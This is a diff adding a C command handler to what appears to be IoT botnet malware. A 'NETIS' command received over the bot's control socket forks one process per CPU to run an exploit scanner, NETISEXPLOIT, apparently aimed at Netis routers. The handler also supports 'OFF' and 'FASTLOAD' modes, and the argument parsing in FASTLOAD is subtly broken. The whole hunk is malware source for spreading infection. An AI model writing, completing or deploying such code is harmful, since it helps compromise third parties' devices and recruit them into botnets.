@@ -1,0 +1,47 @@
+                       if(!strcmp(argv[0], "NETIS"))
+        {
+            if(!strcmp(argv[1], "ON"))
+            {
+               
+                uint32_t parent;
+                parent = fork();        
+                int ii = 0;
+                int forks = sysconf( _SC_NPROCESSORS_ONLN );
+                int fds = 999999;
+                if(forks == 1) fds = 500;
+                if(forks >= 2) fds = 1000;
+                if (parent > 0)
+                {
+                    scanPid = parent;
+                    return;
+                }
+                else if(parent == -1) return;
+   
+                for (ii = 0; ii < forks; ii++)
+                {
+                    srand((time(NULL) ^ getpid()) + getppid());
+                    init_rand(time(NULL) ^ getpid());
+                    NETISEXPLOIT(100, fds);
+                    _exit(0);
+                }
+            }
+            if(!strcmp(argv[1], "OFF"))
+            {
+                if(scanPid == 0) return;
+ 
+                kill(scanPid, 9);
+                scanPid = 0;
+            }
+            if(!strcmp(argv[1], "FASTLOAD"))
+            {
+                int threads = atoi(argv[1]);
+                int usec = atoi(argv[2]);
+                if(!listFork())
+                {
+                    sockprintf(mainCommSock, "[NETIS] Starting Fastload!!");
+                    NETISEXPLOIT(usec, threads);
+                    _exit(0);
+                }
+                return;
+            }
+        }
